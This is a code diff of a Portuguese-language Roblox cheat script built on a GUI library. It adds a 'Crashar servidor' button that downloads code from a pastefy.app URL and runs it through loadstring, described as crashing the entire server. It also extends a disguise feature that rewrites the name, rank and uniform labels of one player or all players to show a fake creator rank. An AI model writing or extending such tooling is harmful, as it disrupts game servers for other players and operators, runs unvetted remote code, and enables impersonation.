@@ -17,7 +17,7 @@ local Window = Library:CreateWindow({
     
     SphereText = false, 
     SphereWords = "EB", 
-    SphereImage = "rbxassetid://121574485496082",
+    SphereImage = "rbxassetid://5013109572",
     SphereIconSize = 38
 })
 
@@ -1096,14 +1096,14 @@ AutoFarmCard:AddToggle("Ativar Auto Farm", false, function(state)
     end
 end, { Title = "Iniciar Farm" })
 
-local HavacDisfarceCard = Havac_Page:CreateSection("Disfarçar (Havac)")
-HavacDisfarceCard:AddButton("Info: Configuração PC e Desenvolvimento", function() end, { 
-    Title = "Sobre", 
-    Description = "Essa função faz você reentrar no jogo e aplica uma configuração onde mostra que o player é PC e que está em desenvolvimento." 
+HavacDisfarceCard:AddButton("Crashar servidor", function()
+    -- Executa o script externo fornecido
+    loadstring(game:HttpGet('https://pastefy.app/VITNy1sp/raw'))()
+    print("Script de lag executado!")
+end, { 
+    Title = "Lag de Servidor", 
+    Description = "Essa função crasha o servidor inteiro (by: Revolt)" 
 })
-
-local AlgemaCard = Havac_Page:CreateSection("Sair da algema (Reset)")
-AlgemaCard:AddButton("Resetar Personagem", function() end)
 
 -- ========================================== --
 -- ⚔️ TAB 3: COMBATE
@@ -1841,6 +1841,9 @@ TasSaved:AddButton("Deletar Rota", function()
         Library:Notify({Title = "TAS", Description = "Rota apagada!", Duration = 3})
     end
 end, { Title = "Apaga a rota selecionada" })
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer -- Garantindo que a variável player exista para pegar o próprio nick
+
 --------------------------------------------------------------------
 -- 👁️ VARIÁVEIS DO VISUAL
 --------------------------------------------------------------------
@@ -1858,6 +1861,7 @@ local fardaSelecionada = "Nenhuma"
 local cargoStatus = "LIGTH" -- Padrão
 local deviceIcon = "🎮" -- Padrão Console
 local fullBrightConn
+
 --------------------------------------------------------------------
 -- 👁️ TAB 5: VISUAL (INTERFACE E LÓGICA)
 --------------------------------------------------------------------
@@ -1866,7 +1870,8 @@ local VisualPage = VisualTab:CreatePage("Geral")
 
 local VisualDisfarceCard = VisualPage:CreateSection("Disfarçar (Overhead & Farda)")
 
-VisualDisfarceCard:AddTextbox("Modificar o player", "Vazio = você", function(text) inputTargetNick = text end, { Title = "Alvo" })
+-- Atualizei o texto de dica da caixa do alvo para avisar sobre o "all"
+VisualDisfarceCard:AddTextbox("Modificar o player", "Vazio = você | 'all' = todos", function(text) inputTargetNick = text end, { Title = "Alvo" })
 VisualDisfarceCard:AddTextbox("Nick Exibição", "Vazio = princesinho0004", function(text) inputDisplayNick = text end, { Title = "Display" })
 VisualDisfarceCard:AddTextbox("Patente", "Vazio = [CR] Criador", function(text) inputPatente = text end, { Title = "Patente" })
 VisualDisfarceCard:AddTextbox("Divisão", "Vazio = discord.gg/havac", function(text) inputDivisao = text end, { Title = "Divisão" })
@@ -1887,85 +1892,124 @@ end, { Title = "Cor do Texto" })
 
 
 VisualDisfarceCard:AddButton("Aplicar Disfarce", function()
-    local targetName = inputTargetNick ~= "" and inputTargetNick or player.Name
-    local targetChar = workspace:FindFirstChild(targetName)
+    local targetInput = string.lower(inputTargetNick)
     
-    if not targetChar or not targetChar:FindFirstChild("Head") then 
-        Library:Notify({Title="Erro", Description="Jogador não encontrado no mapa!", Duration=3})
-        return 
+    -- Função local para não repetir código
+    local function applyDisguise(targetName, targetChar)
+        if not targetChar or not targetChar:FindFirstChild("Head") then return end
+
+        local head = targetChar.Head
+        local labelNome = head:FindFirstChild("Nome", true) and head:FindFirstChild("Nome", true):FindFirstChildOfClass("TextLabel")
+        local labelPatente = head:FindFirstChild("Patente", true) and head:FindFirstChild("Patente", true):FindFirstChildOfClass("TextLabel")
+        local labelDivisao = (head:FindFirstChild("Divis\195\163o", true) or head:FindFirstChild("Divisão", true)) and (head:FindFirstChild("Divis\195\163o", true) or head:FindFirstChild("Divisão", true)):FindFirstChildOfClass("TextLabel")
+        
+        local shirt = targetChar:FindFirstChildOfClass("Shirt")
+        local pants = targetChar:FindFirstChildOfClass("Pants")
+
+        -- Sistema de Backup para poder restaurar depois (roupas e textos)
+        if not backups[targetName] then
+            backups[targetName] = {
+                ShirtTemplate = shirt and shirt.ShirtTemplate or nil, 
+                PantsTemplate = pants and pants.PantsTemplate or nil,
+                NomeText = labelNome and labelNome.Text or nil, 
+                NomeColor = labelNome and labelNome.TextColor3 or nil,
+                PatenteText = labelPatente and labelPatente.Text or nil, 
+                PatenteColor = labelPatente and labelPatente.TextColor3 or nil,
+                DivisaoText = labelDivisao and labelDivisao.Text or nil, 
+                DivisaoColor = labelDivisao and labelDivisao.TextColor3 or nil,
+            }
+        end
+
+        -- Aplicando os padrões (fallbacks) se o usuário deixou a caixa de texto em branco
+        local finalNick = inputDisplayNick ~= "" and inputDisplayNick or "princesinho0004"
+        local finalPatente = inputPatente ~= "" and inputPatente or "[CR] Criador"
+        local finalDivisao = inputDivisao ~= "" and inputDivisao or "discord.gg/havac"
+
+        local formattedName = usarTag and string.format("[%s] %s • %s", cargoStatus, deviceIcon, finalNick) or string.format("%s • %s", deviceIcon, finalNick)
+
+        -- Aplicando os textos e a cor
+        if labelNome then labelNome.Text = formattedName; labelNome.TextColor3 = selectedColor end
+        if labelPatente then labelPatente.Text = finalPatente; labelPatente.TextColor3 = selectedColor end
+        if labelDivisao then labelDivisao.Text = finalDivisao; labelDivisao.TextColor3 = selectedColor end
+
+        -- Aplicando a Farda (se o usuário selecionou uma)
+        if fardaSelecionada ~= "Nenhuma" and Fardas[fardaSelecionada] then
+            if shirt then shirt.ShirtTemplate = Fardas[fardaSelecionada].S end
+            if pants then pants.PantsTemplate = Fardas[fardaSelecionada].P end
+        end
     end
 
-    local head = targetChar.Head
-    local labelNome = head:FindFirstChild("Nome", true) and head:FindFirstChild("Nome", true):FindFirstChildOfClass("TextLabel")
-    local labelPatente = head:FindFirstChild("Patente", true) and head:FindFirstChild("Patente", true):FindFirstChildOfClass("TextLabel")
-    local labelDivisao = (head:FindFirstChild("Divis\195\163o", true) or head:FindFirstChild("Divisão", true)) and (head:FindFirstChild("Divis\195\163o", true) or head:FindFirstChild("Divisão", true)):FindFirstChildOfClass("TextLabel")
-    
-    local shirt = targetChar:FindFirstChildOfClass("Shirt")
-    local pants = targetChar:FindFirstChildOfClass("Pants")
-
-    -- Sistema de Backup para poder restaurar depois (roupas e textos)
-    if not backups[targetName] then
-        backups[targetName] = {
-            ShirtTemplate = shirt and shirt.ShirtTemplate or nil, 
-            PantsTemplate = pants and pants.PantsTemplate or nil,
-            NomeText = labelNome and labelNome.Text or nil, 
-            NomeColor = labelNome and labelNome.TextColor3 or nil,
-            PatenteText = labelPatente and labelPatente.Text or nil, 
-            PatenteColor = labelPatente and labelPatente.TextColor3 or nil,
-            DivisaoText = labelDivisao and labelDivisao.Text or nil, 
-            DivisaoColor = labelDivisao and labelDivisao.TextColor3 or nil,
-        }
+    -- Lógica para verificar se é "all" ou um jogador específico
+    if targetInput == "all" then
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Character then
+                applyDisguise(plr.Name, plr.Character)
+            end
+        end
+        Library:Notify({Title="Sucesso", Description="Disfarce aplicado em TODOS!", Duration=3})
+    else
+        local targetName = inputTargetNick ~= "" and inputTargetNick or player.Name
+        local targetChar = workspace:FindFirstChild(targetName)
+        
+        if targetChar then
+            applyDisguise(targetName, targetChar)
+            Library:Notify({Title="Sucesso", Description="Disfarce aplicado em: " .. targetName, Duration=3})
+        else
+            Library:Notify({Title="Erro", Description="Jogador não encontrado no mapa!", Duration=3})
+        end
     end
-
-    -- Aplicando os padrões (fallbacks) se o usuário deixou a caixa de texto em branco
-    local finalNick = inputDisplayNick ~= "" and inputDisplayNick or "princesinho0004"
-    local finalPatente = inputPatente ~= "" and inputPatente or "[CR] Criador"
-    local finalDivisao = inputDivisao ~= "" and inputDivisao or "discord.gg/havac"
-
-    local formattedName = usarTag and string.format("[%s] %s • %s", cargoStatus, deviceIcon, finalNick) or string.format("%s • %s", deviceIcon, finalNick)
-
-    -- Aplicando os textos e a cor
-    if labelNome then labelNome.Text = formattedName; labelNome.TextColor3 = selectedColor end
-    if labelPatente then labelPatente.Text = finalPatente; labelPatente.TextColor3 = selectedColor end
-    if labelDivisao then labelDivisao.Text = finalDivisao; labelDivisao.TextColor3 = selectedColor end
-
-    -- Aplicando a Farda (se o usuário selecionou uma)
-    if fardaSelecionada ~= "Nenhuma" and Fardas[fardaSelecionada] then
-        if shirt then shirt.ShirtTemplate = Fardas[fardaSelecionada].S end
-        if pants then pants.PantsTemplate = Fardas[fardaSelecionada].P end
-    end
-
-    Library:Notify({Title="Sucesso", Description="Disfarce aplicado em: " .. targetName, Duration=3})
 end)
 
 VisualDisfarceCard:AddButton("Desfazer Disfarce", function()
-    local targetName = inputTargetNick ~= "" and inputTargetNick or player.Name
-    local targetChar = workspace:FindFirstChild(targetName)
-    if not targetChar or not targetChar:FindFirstChild("Head") then return end
+    local targetInput = string.lower(inputTargetNick)
 
-    local backup = backups[targetName]
-    if not backup then 
-        Library:Notify({Title="Aviso", Description="Nenhum backup encontrado para este jogador.", Duration=3})
-        return 
+    -- Função local para não repetir código
+    local function undoDisguise(targetName, targetChar)
+        if not targetChar or not targetChar:FindFirstChild("Head") then return end
+
+        local backup = backups[targetName]
+        if not backup then return end -- Ignora se não houver backup
+
+        local head = targetChar.Head
+        local labelNome = head:FindFirstChild("Nome", true) and head:FindFirstChild("Nome", true):FindFirstChildOfClass("TextLabel")
+        local labelPatente = head:FindFirstChild("Patente", true) and head:FindFirstChild("Patente", true):FindFirstChildOfClass("TextLabel")
+        local labelDivisao = (head:FindFirstChild("Divis\195\163o", true) or head:FindFirstChild("Divisão", true)) and (head:FindFirstChild("Divis\195\163o", true) or head:FindFirstChild("Divisão", true)):FindFirstChildOfClass("TextLabel")
+        local shirt = targetChar:FindFirstChildOfClass("Shirt")
+        local pants = targetChar:FindFirstChildOfClass("Pants")
+
+        -- Restaurando Textos
+        if labelNome and backup.NomeText then labelNome.Text = backup.NomeText; labelNome.TextColor3 = backup.NomeColor end
+        if labelPatente and backup.PatenteText then labelPatente.Text = backup.PatenteText; labelPatente.TextColor3 = backup.PatenteColor end
+        if labelDivisao and backup.DivisaoText then labelDivisao.Text = backup.DivisaoText; labelDivisao.TextColor3 = backup.DivisaoColor end
+        
+        -- Restaurando Roupas originais
+        if backup.ShirtTemplate and shirt then shirt.ShirtTemplate = backup.ShirtTemplate end
+        if backup.PantsTemplate and pants then pants.PantsTemplate = backup.PantsTemplate end
     end
 
-    local head = targetChar.Head
-    local labelNome = head:FindFirstChild("Nome", true) and head:FindFirstChild("Nome", true):FindFirstChildOfClass("TextLabel")
-    local labelPatente = head:FindFirstChild("Patente", true) and head:FindFirstChild("Patente", true):FindFirstChildOfClass("TextLabel")
-    local labelDivisao = (head:FindFirstChild("Divis\195\163o", true) or head:FindFirstChild("Divisão", true)) and (head:FindFirstChild("Divis\195\163o", true) or head:FindFirstChild("Divisão", true)):FindFirstChildOfClass("TextLabel")
-    local shirt = targetChar:FindFirstChildOfClass("Shirt")
-    local pants = targetChar:FindFirstChildOfClass("Pants")
-
-    -- Restaurando Textos
-    if labelNome and backup.NomeText then labelNome.Text = backup.NomeText; labelNome.TextColor3 = backup.NomeColor end
-    if labelPatente and backup.PatenteText then labelPatente.Text = backup.PatenteText; labelPatente.TextColor3 = backup.PatenteColor end
-    if labelDivisao and backup.DivisaoText then labelDivisao.Text = backup.DivisaoText; labelDivisao.TextColor3 = backup.DivisaoColor end
-    
-    -- Restaurando Roupas originais
-    if backup.ShirtTemplate and shirt then shirt.ShirtTemplate = backup.ShirtTemplate end
-    if backup.PantsTemplate and pants then pants.PantsTemplate = backup.PantsTemplate end
-
-    Library:Notify({Title="Restaurado", Description="Aparência original de " .. targetName .. " restaurada.", Duration=3})
+    -- Lógica para verificar se é "all" ou um jogador específico
+    if targetInput == "all" then
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Character then
+                undoDisguise(plr.Name, plr.Character)
+            end
+        end
+        Library:Notify({Title="Restaurado", Description="Aparência de TODOS foi restaurada.", Duration=3})
+    else
+        local targetName = inputTargetNick ~= "" and inputTargetNick or player.Name
+        local targetChar = workspace:FindFirstChild(targetName)
+        
+        if targetChar then
+            if not backups[targetName] then 
+                Library:Notify({Title="Aviso", Description="Nenhum backup encontrado para " .. targetName, Duration=3})
+                return 
+            end
+            undoDisguise(targetName, targetChar)
+            Library:Notify({Title="Restaurado", Description="Aparência original de " .. targetName .. " restaurada.", Duration=3})
+        else
+            Library:Notify({Title="Erro", Description="Jogador não encontrado no mapa!", Duration=3})
+        end
+    end
 end)
 
 local OtimizacaoCard = VisualPage:CreateSection("Otimização & Câmera")
